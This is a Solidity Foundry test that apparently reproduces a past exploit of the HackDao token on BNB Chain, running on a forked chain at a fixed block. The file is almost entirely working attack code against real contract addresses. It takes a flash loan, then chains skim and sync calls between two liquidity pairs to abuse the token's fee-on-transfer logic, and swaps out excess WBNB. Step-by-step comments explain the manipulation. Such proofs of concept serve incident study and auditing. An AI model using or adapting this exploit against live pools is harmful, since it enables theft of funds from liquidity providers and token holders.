// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1529084919976034304
// @Contract address
// https://bscscan.com/address/0x94e06c77b02ade8341489ab9a23451f68c13ec1c#code

contract ContractTest is Test {
    IERC20 HackDao = IERC20(0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2); // HackDao WBNB
    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225); //HackDao USDT   <--- this is the *special* `uniswapV2Pair` hardcoded inside the HackDao token
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8546", 18_073_756);
    }

    function testExploit() public {
        // Approvals for the router swaps (WBNB<->HackDao) that occur inside the flash.
        WBNB.approve(address(Router), type(uint256).max);
        HackDao.approve(address(Router), type(uint256).max);

        // EXPLOIT STEP 0 (setup): Flash-borrow 1,900 WBNB from DODO DVM pool (no collateral, callback-only).
        // The flash gives the capital to buy HackDao and the repayment happens at the very end.
        // Callback will be DPPFlashLoanCall on this contract (standard DVM flash loan pattern).
        DVM(dodo).flashLoan(1900 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
        // EXPLOIT STEP 1: Use the borrowed WBNB to buy HackDao on the WBNB/HackDao pair (Pair1) via Pancake router.
        // Because HackDao is a fee-on-transfer token, the actual HackDao received is amount-fee (taxed on the OUT transfer
        // from the LP). The Pair1 reserves are updated to the post-transfer balances inside the swap, but because of
        // the fee the economic balance the LP "thinks" it has vs. reality begins to diverge vs. what a non-fee token would do.
        // At this point real HackDao bal in Pair1 is *below* what a naive observer might expect from the swap math.
        buyHackDao();

        // EXPLOIT STEP 2: Push the just-bought HackDao *into* Pair1.
        // Transfer recipient=Pair1 != token.uniswapV2Pair (the USDT pair), therefore normal fee path:
        //   attacker debits 100%, Pair1 credited only 88%, remainder taxed to 0x1 / pool / referrers.
        // Consequence: Pair1's *actual* HackDao balanceOf now > its cached reserve0 (the push added net tokens).
        HackDao.transfer(address(Pair1), HackDao.balanceOf(address(this)));

        // EXPLOIT STEP 3: skim excess from Pair1 into Pair2 (the special USDT pair).
        // skim sends (balance0 - reserve0) of HackDao to Pair2.
        // The transfer is *to* Pair2 which *is* token.uniswapV2Pair => the "sell" branch fires:
        //   Pair1 (sender) is debited amount + extra fee, Pair2 (recipient) is credited the *full* amount.
        // Net after transfer: Pair1's real balance drops *below* its (still-unupdated) reserve0 by ~fee amount.
        Pair1.skim(address(Pair2));

        // EXPLOIT STEP 4: sync Pair1. This forces reserve0 := current actual balance (the depleted value).
        // Now Pair1's recorded reserve0 is artificially collapsed (low), while its WBNB reserve1 is untouched.
        // The "huge HackDao input" illusion has been prepared.
        Pair1.sync();

        // EXPLOIT STEP 5: skim the HackDao back from Pair2 into Pair1.
        // This moves the previously-skimmed tokens back (minus another fee because this transfer is *from* the special pair
        // but *to* non-special Pair1, so normal 88% credit path).
        // Pair1 actual bal now high relative to the just-synced-low reserve.
        Pair2.skim(address(Pair1));

        // EXPLOIT STEP 6: Sell the (manipulated) position on Pair1.
        // We compute amountin as the *current actual balance minus the artificially low reserve0*.
        // This amountin is huge (the skimmed tokens + the delta from low reserve).
        // amountout formula is the constant-product with 0.25% fee, using the *original* (high) reserve1.
        // Then call swap(0, huge_WBNB_out, this) -- because the HackDao is *already inside the pair* from prior transfers,
        // the pair's post-swap balance check will see exactly that large amount0In, pass the K check against the still-high WBNB side,
        // and happily send the large WBNB payout. Reserves are then updated.
        (uint256 reserve0, uint256 reserve1,) = Pair1.getReserves(); // HackDao WBNB
        uint256 amountAfter = HackDao.balanceOf(address(Pair1));
        uint256 amountin = amountAfter - reserve0;
        uint256 amountout = amountin * 9975 * reserve1 / (reserve0 * 10_000 + amountin * 9975);
        Pair1.swap(0, amountout, address(this), "");

        // EXPLOIT STEP 7: repay the DODO flash loan (principal only; no fee on this DVM pool in the PoC).
        // ~163 WBNB profit remains in the contract (the excess extracted from Pair1's WBNB reserves).
        WBNB.transfer(dodo, 1900 * 1e18);
    }

    function buyHackDao() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(HackDao);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
